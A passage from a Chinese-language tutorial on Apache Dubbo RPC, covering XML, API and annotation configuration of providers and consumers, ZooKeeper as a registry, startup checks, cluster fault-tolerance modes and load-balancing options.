http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;&gt; &lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt; &lt;dubbo:application name=&quot;provider&quot; owner=&quot;sihai&quot;&gt; &lt;dubbo:parameter key=&quot;qos.enable&quot; value=&quot;true&quot;/&gt; &lt;dubbo:parameter key=&quot;qos.accept.foreign.ip&quot; value=&quot;false&quot;/&gt; &lt;dubbo:parameter key=&quot;qos.port&quot; value=&quot;55555&quot;/&gt; &lt;/dubbo:application&gt; &lt;dubbo:monitor protocol=&quot;registry&quot;/&gt; &lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt; &lt;!--&lt;dubbo:registry address=&quot;N/A&quot;/&gt;--&gt; &lt;dubbo:registry address=&quot;N/A&quot; /&gt; &lt;!--当前服务发布所依赖的协议；webservice、Thrift、Hessain、http--&gt; &lt;dubbo:protocol name=&quot;dubbo&quot; port=&quot;20880&quot;/&gt; &lt;!--服务发布的配置，需要暴露的服务接口--&gt; &lt;dubbo:service interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot;/&gt; &lt;!--Bean bean定义--&gt; &lt;bean id=&quot;providerService&quot; class=&quot;com.sihai.dubbo.provider.service.ProviderServiceImpl&quot;/&gt;&lt;/beans&gt; 说明： 1、上面的文件其实就是类似 spring 的配置文件，而且， dubbo 底层就是 spring 。 2、节点： dubbo:application 就是整个项目在分布式架构中的唯一名称，可以在 name 属性中配置，另外还可以配置 owner 字段，表示属于谁。 下面的参数是可以不配置的，这里配置是因为出现了端口的冲突，所以配置。 3、节点： dubbo:monitor 监控中心配置， 用于配置连接监控中心相关信息，可以不配置，不是必须的参数。 4、节点： dubbo:registry 配置注册中心的信息，比如，这里我们可以配置 zookeeper 作为我们的注册中心。 address 是注册中心的地址，这里我们配置的是 N/A 表示由 dubbo 自动分配地址。或者说是一种直连的方式，不通过注册中心。 5、节点： dubbo:protocol 服务发布的时候 dubbo 依赖什么协议，可以配置 dubbo 、 webservice 、 http 等协议。 6、节点： dubbo:service 这个节点就是我们的重点了，当我们服务发布的时候，我们就是通过这个配置将我们的服务发布出去的。 interface 是接口的包路径， ref 是第 ⑦ 点配置的接口的 bean 。 7、最后，我们需要像配置 spring 的接口一样，配置接口的 bean 。 到这一步，关于服务端的配置就完成了，下面我们通过 main 方法将接口发布出去。 发布接口 1234567891011121314151617181920212223242526package com.sihai.dubbo.provider;import com.alibaba.dubbo.config.ApplicationConfig;import com.alibaba.dubbo.config.ProtocolConfig;import com.alibaba.dubbo.config.RegistryConfig;import com.alibaba.dubbo.config.ServiceConfig;import com.alibaba.dubbo.container.Main;import com.sihai.dubbo.provider.service.ProviderService;import com.sihai.dubbo.provider.service.ProviderServiceImpl;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.io.IOException;/** * xml方式启动 * */public class App { public static void main( String[] args ) throws IOException { //加载xml配置文件启动 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;META-INF/spring/provider.xml&quot;); context.start(); System.in.read(); // 按任意键退出 }} 发布接口非常简单，因为 dubbo 底层就是依赖 spring 的，所以，我们只需要通过 ClassPathXmlApplicationContext 拿到我们刚刚配置好的 xml ，然后调用 context.start() 方法就启动了。 看到下面的截图，就算是启动成功了，接口也就发布出去了。 你以为到这里就结束了了，并不是的，我们拿到 dubbo 暴露出去的 url 分析分析。 Dubbo 暴露的 URL 1dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService?anyhost=true&amp;application=provider&amp;bean.name=com.sihai.dubbo.provider.service.ProviderService&amp;bind.ip=192.168.234.1&amp;bind.port=20880&amp;dubbo=2.0.2&amp;generic=false&amp;interface=com.sihai.dubbo.provider.service.ProviderService&amp;methods=SayHello&amp;owner=sihai&amp;pid=8412&amp;qos.accept.foreign.ip=false&amp;qos.enable=true&amp;qos.port=55555&amp;side=provider&amp;timestamp=1562077289380 分析如下： 1、首先，在形式上我们发现，其实这么牛逼的 dubbo 也是用类似于 http 的协议发布自己的服务的，只是这里我们用的是 dubbo 协议。 2、 dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService 上面这段链接就是 ? 之前的链接，构成：协议://ip: 端口 / 接口。发现是不是也没有什么神秘的。 3、 anyhost=true&amp;application=provider&amp;bean.name=com.sihai.dubbo.provider.service.ProviderService&amp;bind.ip=192.168.234.1&amp;bind.port=20880&amp;dubbo=2.0.2&amp;generic=false&amp;interface=com.sihai.dubbo.provider.service.ProviderService&amp;methods=SayHello&amp;owner=sihai&amp;pid=8412&amp;qos.accept.foreign.ip=false&amp;qos.enable=true&amp;qos.port=55555&amp;side=provider&amp;timestamp=1562077289380 ? 之后的字符串，分析后你发现，这些都是刚刚在 provider.xml 中配置的字段，然后通过 &amp; 拼接而成的，闻到了 http 的香味了吗？ 终于， dubbo 服务端入门了。下面我们看看拿到了 url 后，怎么消费呢？ # 1.6.2 消费端 上面提到，我们在服务端提供的只是点对点的方式提供服务，并没有使用注册中心，所以，下面的配置也是会有一些不一样的。 消费端环境配置 首先，我们在消费端的 resource 下建立配置文件 consumer.xml 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:dubbo=&quot;http://code.alibabatech.com/schema/dubbo&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;&gt; &lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt; &lt;dubbo:application name=&quot;consumer&quot; owner=&quot;sihai&quot;/&gt; &lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt; &lt;!--点对点的方式--&gt; &lt;dubbo:registry address=&quot;N/A&quot; /&gt; &lt;!--&lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot; check=&quot;false&quot;/&gt;--&gt; &lt;!--生成一个远程服务的调用代理--&gt; &lt;!--点对点方式--&gt; &lt;dubbo:reference id=&quot;providerService&quot;interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;url=&quot;dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService&quot;/&gt; &lt;!--&lt;dubbo:reference id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt;--&gt;&lt;/beans&gt; 分析如下所示： 1、发现这里的 dubbo:application 和 dubbo:registry 是一致的 2、 dubbo:reference ：我们这里采用点对点的方式，所以，需要配置在服务端暴露的 url maven 依赖 和服务端一样 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.ouyangsihai&lt;/groupId&gt; &lt;artifactId&gt;dubbo-consumer&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.ouyangsihai&lt;/groupId&gt; &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/dubbo --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;dubbo&lt;/artifactId&gt; &lt;version&gt;2.6.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.101tec&lt;/groupId&gt; &lt;artifactId&gt;zkclient&lt;/artifactId&gt; &lt;version&gt;0.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-all&lt;/artifactId&gt; &lt;version&gt;4.1.32.Final&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-framework&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-recipes&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 调用服务 123456789101112131415161718192021222324252627package com.sihai.dubbo.consumer;import com.alibaba.dubbo.config.ApplicationConfig;import com.alibaba.dubbo.config.ReferenceConfig;import com.alibaba.dubbo.config.RegistryConfig;import com.sihai.dubbo.provider.service.ProviderService;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.io.IOException;/** * xml的方式调用 * */public class App { public static void main( String[] args ) throws IOException { ClassPathXmlApplicationContext context=new ClassPathXmlApplicationContext(&quot;consumer.xml&quot;); context.start(); ProviderService providerService = (ProviderService) context.getBean(&quot;providerService&quot;); String str = providerService.SayHello(&quot;hello&quot;); System.out.println(str); System.in.read(); }} 这里和服务端的发布如出一辙 如此，我们就成功调用接口了。 # 1.7 加入 zookeeper 作为注册中心 在前面的案例中，我们没有使用任何的注册中心，而是用一种直连的方式进行的。但是，实际上很多时候，我们都是使用 dubbo + zookeeper 的方式，使用 zookeeper 作为注册中心，这里，我们就介绍一下 zookeeper 作为注册中心的使用方法。 这里，我们在前面的入门实例中进行改造。 # 1.7.1 服务端 在服务端中，我们只需要修改 provider.xml 即可。 123456789101112131415161718192021222324252627282930&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:dubbo=&quot;http://code.alibabatech.com/schema/dubbo&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;&gt; &lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt; &lt;dubbo:application name=&quot;provider&quot; owner=&quot;sihai&quot;&gt; &lt;dubbo:parameter key=&quot;qos.enable&quot; value=&quot;true&quot;/&gt; &lt;dubbo:parameter key=&quot;qos.accept.foreign.ip&quot; value=&quot;false&quot;/&gt; &lt;dubbo:parameter key=&quot;qos.port&quot; value=&quot;55555&quot;/&gt; &lt;/dubbo:application&gt; &lt;dubbo:monitor protocol=&quot;registry&quot;/&gt; &lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt; &lt;!--&lt;dubbo:registry address=&quot;N/A&quot;/&gt;--&gt; &lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot; check=&quot;false&quot;/&gt; &lt;!--当前服务发布所依赖的协议；webservice、Thrift、Hessain、http--&gt; &lt;dubbo:protocol name=&quot;dubbo&quot; port=&quot;20880&quot;/&gt; &lt;!--服务发布的配置，需要暴露的服务接口--&gt; &lt;dubbo:service interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot;/&gt; &lt;!--Bean bean定义--&gt; &lt;bean id=&quot;providerService&quot; class=&quot;com.sihai.dubbo.provider.service.ProviderServiceImpl&quot;/&gt;&lt;/beans&gt; 重点关注这句话 1&lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot; /&gt; 在 address 中，使用我们的 zookeeper 的地址。 如果是 zookeeper 集群的话，使用下面的方式。 1&lt;dubbo:registry protocol=&quot;zookeeper&quot; address=&quot;192.168.11.129:2181,192.168.11.137:2181,192.168.11.138:2181&quot;/&gt; 服务端的配置就好了，其他的跟 入门案例 一样。 # 1.7.2 消费端 跟服务端一样，在消费端，我们也只需要修改 consumer.xml 即可。 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:dubbo=&quot;http://code.alibabatech.com/schema/dubbo&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;&gt; &lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt; &lt;dubbo:application name=&quot;consumer&quot; owner=&quot;sihai&quot;/&gt; &lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt; &lt;!--点对点的方式--&gt; &lt;!--&lt;dubbo:registry address=&quot;N/A&quot; /&gt;--&gt; &lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot; check=&quot;false&quot;/&gt; &lt;!--生成一个远程服务的调用代理--&gt; &lt;!--点对点方式--&gt; &lt;!--&lt;dubbo:reference id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; url=&quot;dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService&quot;/&gt;--&gt; &lt;dubbo:reference id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt;&lt;/beans&gt; 1、注册中心配置跟服务端一样 1&lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot;/&gt; 2、 dubbo:reference 由于我们这里使用 zookeeper 作为注册中心，所以，跟点对点的方式是不一样的，这里不再需要 dubbo 服务端提供的 url 了，只需要直接引用服务端提供的接口即可 12&lt;dubbo:reference id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt; 好了，消费端也配置好了，这样就可以使用修改的入门案例，重新启动运行了。 同样成功了。 这时候的区别在于，将 dubbo 发布的 url 注册到了 zookeeper ，消费端从 zookeeper 消费， zookeeper 相当于一个中介，给消费者提供服务。 你以为这就完了？不，好戏才刚刚开始呢。 # 1.8 多种配置方式 在入门实例的时候，我们使用的是 xml 配置的方式，对 dubbo 的环境进行了配置，但是，官方还提供了其他的配置方式，这里我们也一一分解。 # 1.8.1 API 配置方式 这种方式其实官方是不太推荐的，官方推荐使用 xml 配置的方式，但是，在有的时候测试的时候，还是可以用的到的，另外，为了保证完整性，这些内容还是有必要讲讲的。 首先还是回到服务端工程。 服务端 这里我们使用 api 的方式配置，所以， provider.xml 这个配置文件就暂时不需要了，我们只需要在上面的 AppApi 这个类中的 main 方法中用 api 配置及启动即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.sihai.dubbo.provider;import com.alibaba.dubbo.config.ApplicationConfig;import com.alibaba.dubbo.config.ProtocolConfig;import com.alibaba.dubbo.config.RegistryConfig;import com.alibaba.dubbo.config.ServiceConfig;import com.sihai.dubbo.provider.service.ProviderService;import com.sihai.dubbo.provider.service.ProviderServiceImpl;import java.io.IOException;/** * Api方式启动 * api的方式调用不需要其他的配置，只需要下面的代码即可。 * 但是需要注意，官方建议： * Api方式用于测试用例使用，推荐xml的方式 */public class AppApi{ public static void main( String[] args ) throws IOException { // 服务实现 ProviderService providerService = new ProviderServiceImpl(); // 当前应用配置 ApplicationConfig application = new ApplicationConfig(); application.setName(&quot;provider&quot;); application.setOwner(&quot;sihai&quot;); // 连接注册中心配置 RegistryConfig registry = new RegistryConfig(); registry.setAddress(&quot;zookeeper://localhost:2181&quot;);// registry.setUsername(&quot;aaa&quot;);// registry.setPassword(&quot;bbb&quot;); // 服务提供者协议配置 ProtocolConfig protocol = new ProtocolConfig(); protocol.setName(&quot;dubbo&quot;); protocol.setPort(20880); //protocol.setThreads(200); // 注意：ServiceConfig为重对象，内部封装了与注册中心的连接， //以及开启服务端口 // 服务提供者暴露服务配置 // 此实例很重，封装了与注册中心的连接，请自行缓存， //否则可能造成内存和连接泄漏 ServiceConfig&lt;ProviderService&gt; service = new ServiceConfig&lt;ProviderService&gt;(); service.setApplication(application); // 多个注册中心可以用setRegistries() service.setRegistry(registry); // 多个协议可以用setProtocols() service.setProtocol(protocol); service.setInterface(ProviderService.class); service.setRef(providerService); service.setVersion(&quot;1.0.0&quot;); // 暴露及注册服务 service.export(); }} 分析说明如下所示： 看到上面的代码是不是云里雾里，不要慌，我们通过对照 xml 的方式分析一下。 registry 的 xml 方式 1&lt;dubbo:registry protocol=&quot;zookeeper&quot; address=&quot;localhost:2181&quot;/&gt; API 的方式 12RegistryConfig registry = new RegistryConfig();registry.setAddress(&quot;zookeeper://localhost:2181&quot;); dubbo:registry 节点对应 RegistryConfig ， xml 的属性对应 API 方式用 set 方法就可以了。对比之下，你就会发现，如果 API 的方式不熟悉，可以对照 xml 配置方式就可以。 其他 API 1234567891011org.apache.dubbo.config.ServiceConfigorg.apache.dubbo.config.ReferenceConfigorg.apache.dubbo.config.ProtocolConfigorg.apache.dubbo.config.RegistryConfigorg.apache.dubbo.config.MonitorConfigorg.apache.dubbo.config.ApplicationConfigorg.apache.dubbo.config.ModuleConfigorg.apache.dubbo.config.ProviderConfigorg.apache.dubbo.config.ConsumerConfigorg.apache.dubbo.config.MethodConfigorg.apache.dubbo.config.ArgumentConfig 更详细的可以查看官方文档： http://dubbo.apache.org/zh-cn… 我们再看看我配置的消费端的 Api 方式。 消费端 同样，我们不需要 consumer.xml 配置文件了，只需要在 main 方法中启动即可。 123456789101112131415161718192021222324252627282930313233343536373839package com.sihai.dubbo.consumer;import com.alibaba.dubbo.config.ApplicationConfig;import com.alibaba.dubbo.config.ReferenceConfig;import com.alibaba.dubbo.config.RegistryConfig;import com.sihai.dubbo.provider.service.ProviderService;/** * api的方式调用 * api的方式调用不需要其他的配置，只需要下面的代码即可。 * 但是需要注意，官方建议： * Api方式用于测试用例使用，推荐xml的方式 */public class AppApi { public static void main(String[] args) { // 当前应用配置 ApplicationConfig application = new ApplicationConfig(); application.setName(&quot;consumer&quot;); application.setOwner(&quot;sihai&quot;); // 连接注册中心配置 RegistryConfig registry = new RegistryConfig(); registry.setAddress(&quot;zookeeper://localhost:2181&quot;); // 注意：ReferenceConfig为重对象，内部封装了与注册中心的连接， //以及与服务提供方的连接 // 引用远程服务 ReferenceConfig&lt;ProviderService&gt; reference = new ReferenceConfig&lt;ProviderService&gt;(); // 此实例很重，封装了与注册中心的连接以及与提供者的连接，请自行缓存，否则可能造成内存和连接泄漏 reference.setApplication(application); reference.setRegistry(registry); // 多个注册中心可以用setRegistries() reference.setInterface(ProviderService.class); // 和本地bean一样使用xxxService ProviderService providerService = reference.get(); // 注意：此代理对象内部封装了所有通讯细节，对象较重，请缓存复用 providerService.SayHello(&quot;hello dubbo! I am sihai!&quot;); }} 这部分的 API 配置的方式就到这了，注意：官方推荐 xml 的配置方法 # 1.8.2 注解配置方式 注解配置方式还是需要了解一下的，现在微服务都倾向于这种方式，这也是以后发展的趋势， 0 配置应该是这几年的趋势。 那么如何对 dubbo 使用注解的方式呢？我们先看服务端。 服务端 第一步：定义接口及实现类，在上面的截图中的 annotation 包下 12345678package com.sihai.dubbo.provider.service.annotation;/** * 注解方式接口 */public interface ProviderServiceAnnotation { String SayHelloAnnotation(String word);} 1234567891011121314package com.sihai.dubbo.provider.service.annotation;import com.alibaba.dubbo.config.annotation.Service;/** * 注解方式实现类 */@Service(timeout = 5000)public class ProviderServiceImplAnnotation implements ProviderServiceAnnotation{ public String SayHelloAnnotation(String word) { return word; }} @Service @Service 用来配置 Dubbo 的服务提供方。 第二步：组装服务提供方。通过 Spring 中 Java Config 的技术（ @Configuration ）和 annotation 扫描（ @EnableDubbo ）来发现、组装、并向外提供 Dubbo 的服务。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.sihai.dubbo.provider.configuration;import com.alibaba.dubbo.config.ApplicationConfig;import com.alibaba.dubbo.config.ProtocolConfig;import com.alibaba.dubbo.config.ProviderConfig;import com.alibaba.dubbo.config.RegistryConfig;import com.alibaba.dubbo.config.spring.context.annotation.EnableDubbo;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * 注解方式配置 */@Configuration@EnableDubbo(scanBasePackages = &quot;com.sihai.dubbo.provider.service.annotation&quot;)public class DubboConfiguration { @Bean // #1 服务提供者信息配置 public ProviderConfig providerConfig() { ProviderConfig providerConfig = new ProviderConfig(); providerConfig.setTimeout(1000); return providerConfig; } @Bean // #2 分布式应用信息配置 public ApplicationConfig applicationConfig() { ApplicationConfig applicationConfig = new ApplicationConfig(); applicationConfig.setName(&quot;dubbo-annotation-provider&quot;); return applicationConfig; } @Bean // #3 注册中心信息配置 public RegistryConfig registryConfig() { RegistryConfig registryConfig = new RegistryConfig(); registryConfig.setProtocol(&quot;zookeeper&quot;); registryConfig.setAddress(&quot;localhost&quot;); registryConfig.setPort(2181); return registryConfig; } @Bean // #4 使用协议配置，这里使用 dubbo public ProtocolConfig protocolConfig() { ProtocolConfig protocolConfig = new ProtocolConfig(); protocolConfig.setName(&quot;dubbo&quot;); protocolConfig.setPort(20880); return protocolConfig; }} 分析说明如下： 1、通过 @EnableDubbo 指定在 com.sihai.dubbo.provider.service.annotation 下扫描所有标注有 @Service 的类 2、通过 @Configuration 将 DubboConfiguration 中所有的 @Bean 通过 Java Config 的方式组装出来并注入给 Dubbo 服务，也就是标注有 @Service 的类。 这其中就包括了： 1234ProviderConfig：服务提供方配置ApplicationConfig：应用配置RegistryConfig：注册中心配置ProtocolConfig：协议配置 看起来很复杂，其实。。。 第三步：启动服务 1234567891011121314151617181920package com.sihai.dubbo.provider;import com.alibaba.dubbo.config.spring.context.annotation.DubboComponentScan;import com.sihai.dubbo.provider.configuration.DubboConfiguration;import org.springframework.context.annotation.AnnotationConfigApplicationContext;import sun.applet.Main;import java.io.IOException;/** * 注解启动方式 */public class AppAnnotation { public static void main(String[] args) throws IOException { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(DubboConfiguration.class); context.start(); System.in.read(); }} 发现输出下面信息就表示 success 了 消费端 同样我们下看看消费端的工程，有一个感性认识。 第一步：引用服务 12345678910111213141516171819package com.sihai.dubbo.consumer.Annotation;import com.alibaba.dubbo.config.annotation.Reference;import com.sihai.dubbo.provider.service.annotation.ProviderServiceAnnotation;import org.springframework.stereotype.Component;/** * 注解方式的service */@Component(&quot;annotatedConsumer&quot;)public class ConsumerAnnotationService { @Reference private ProviderServiceAnnotation providerServiceAnnotation; public String doSayHello(String name) { return providerServiceAnnotation.SayHelloAnnotation(name); }} 在 ConsumerAnnotationService 类中，通过 @Reference 引用服务端提供的类，然后通过方法调用这个类的方式，给消费端提供接口。 注意：如果这里找不到 ProviderServiceAnnotation 类，请在服务端先把服务端工程用 Maven intall 一下，然后将服务端的依赖放到消费端的 pom 中。如下： 12345&lt;dependency&gt; &lt;groupId&gt;com.ouyangsihai&lt;/groupId&gt; &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 解释一下：引入的 jar 包里面只是未被实现的接口， rpc 需要在客户端服务端定义一套统一的接口，然后在服务端实现接口，实际上还是网络通信，只不过长得像本地实现 第二步：组装服务消费者 这一步和服务端是类似的，这里就不在重复了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.sihai.dubbo.consumer.configuration;import com.alibaba.dubbo.config.ApplicationConfig;import com.alibaba.dubbo.config.ConsumerConfig;import com.alibaba.dubbo.config.RegistryConfig;import com.alibaba.dubbo.config.spring.context.annotation.EnableDubbo;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.ComponentScan;import org.springframework.context.annotation.Configuration;import java.util.HashMap;import java.util.Map;/** * 注解配置类 */@Configuration@EnableDubbo(scanBasePackages = &quot;com.sihai.dubbo.consumer.Annotation&quot;)@ComponentScan(value = {&quot;com.sihai.dubbo.consumer.Annotation&quot;})public class ConsumerConfiguration { @Bean // 应用配置 public ApplicationConfig applicationConfig() { ApplicationConfig applicationConfig = new ApplicationConfig(); applicationConfig.setName(&quot;dubbo-annotation-consumer&quot;); Map&lt;String, String&gt; stringStringMap = new HashMap&lt;String, String&gt;(); stringStringMap.put(&quot;qos.enable&quot;,&quot;true&quot;); stringStringMap.put(&quot;qos.accept.foreign.ip&quot;,&quot;false&quot;); stringStringMap.put(&quot;qos.port&quot;,&quot;33333&quot;); applicationConfig.setParameters(stringStringMap); return applicationConfig; } @Bean // 服务消费者配置 public ConsumerConfig consumerConfig() { ConsumerConfig consumerConfig = new ConsumerConfig(); consumerConfig.setTimeout(3000); return consumerConfig; } @Bean // 配置注册中心 public RegistryConfig registryConfig() { RegistryConfig registryConfig = new RegistryConfig(); registryConfig.setProtocol(&quot;zookeeper&quot;); registryConfig.setAddress(&quot;localhost&quot;); registryConfig.setPort(2181); return registryConfig; }} 第三步：发起远程调用 在 main 方法中通过启动一个 Spring Context ，从其中查找到组装好的 Dubbo 的服务消费者，并发起一次远程调用。 1234567891011121314151617181920212223242526package com.sihai.dubbo.consumer;import com.sihai.dubbo.consumer.Annotation.ConsumerAnnotationService;import com.sihai.dubbo.consumer.configuration.ConsumerConfiguration;import com.sihai.dubbo.provider.service.ProviderService;import org.springframework.context.annotation.AnnotationConfigApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.io.IOException;/** * 注解方式启动 * */public class AppAnnotation{ public static void main( String[] args ) throws IOException { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(ConsumerConfiguration.class); context.start(); // 启动 ConsumerAnnotationService consumerAnnotationService = context.getBean(ConsumerAnnotationService.class); String hello = consumerAnnotationService.doSayHello(&quot;annotation&quot;); // 调用方法 System.out.println(&quot;result: &quot; + hello); // 输出结果 }} 结果如下所示： # 1.9 常用场景 在下面的讲解中，都会是以 xml 配置的方式来讲解的，这也是 dubbo 官方比较推荐的方式。以下的操作都是在服务端的 xml 配置文件和消费端的配置文件来讲解的。 # 1.9.1 启动时检查 Dubbo 缺省会在启动时检查依赖的服务是否可用，不可用时会抛出异常，阻止 Spring 初始化完成，以便上线时，能及早发现问题，默认 check=&quot;true&quot; 。 但是，有的时候，我们并不是都需要启动时就检查的，比如测试的时候，我们是需要更快速的启动，所以，这种场景的时候，我们是需要关闭这个功能的。 下面，我们看看如何使用这个功能。 在服务端注册的时候（客户端注册时同样适用）； 1&lt;dubbo:registry protocol=&quot;zookeeper&quot; address=&quot;localhost:2181,localhost:2182,localhost:2183&quot; check=&quot;false&quot;/&gt; 在客户端引用服务端服务的时候； 12&lt;dubbo:reference check=&quot;false&quot; id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt; 就是这么简单，就是这么强！ # 1.9.2 集群容错 dubbo 也是支持集群容错的，同时也有很多可选的方案，其中，默认的方案是 failover ，也就是重试机制。 首先，我们先把所有的容错机制都整理一遍，然后再看看使用。 集群模式 说明 使用方法 Failover Cluster 失败自动切换，当出现失败，重试其它服务器。通常用于读操作，但重试会带来更长延迟。可通过 retries=&quot;2&quot; 来设置重试次数 (不含第一次)。 cluster=&quot;xxx&quot; xxx：集群模式名称 ，例如 cluster=&quot;failover&quot; Failfast Cluster 快速失败，只发起一次调用，失败立即报错。通常用于非幂等性的写操作，比如新增记录。 Failsafe Cluster 失败安全，出现异常时，直接忽略。 Failback Cluster 失败自动恢复，后台记录失败请求，定时重发。通常用于消息通知操作。 Forking Cluster 并行调用多个服务器，只要一个成功即返回。通常用于实时性要求较高的读操作，但需要浪费更多服务资源。可通过 forks=&quot;2&quot; 来设置最大并行数。 Broadcast Cluster 广播调用所有提供者，逐个调用，任意一台报错则报错。通常用于通知所有提供者更新缓存或日志等本地资源信息。 使用实例 在发布服务或者引用服务的时候设置 1234&lt;!--服务发布的配置，需要暴露的服务接口--&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot;/&gt; 12&lt;dubbo:reference cluster=&quot;failover&quot; retries=&quot;2&quot; check=&quot;false&quot; id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt; # 1.9.3 负载均衡 负载均衡想必是一个再熟悉不过的概念了，所以， dubbo 支持也是再正常不过了，这里也总结一下 dubbo 支持的负载均衡的一些方案及使用方法。 负载均衡模式 说明 使用方法 Random LoadBalance 随机 按权重设置随机概率 &lt;dubbo:service loadbalance=&quot;xxx&quot;/&gt; xxx：负载均衡方法 RoundRobin LoadBalance 轮询 按公约后的权重设置轮询比率。 LeastActive LoadBalance 最少活跃调用数 相同活跃数的随机，活跃数指调用前后计数差。 ConsistentHash LoadBalance 一致性 Hash 相同参数的请求总是发到同一提供者。 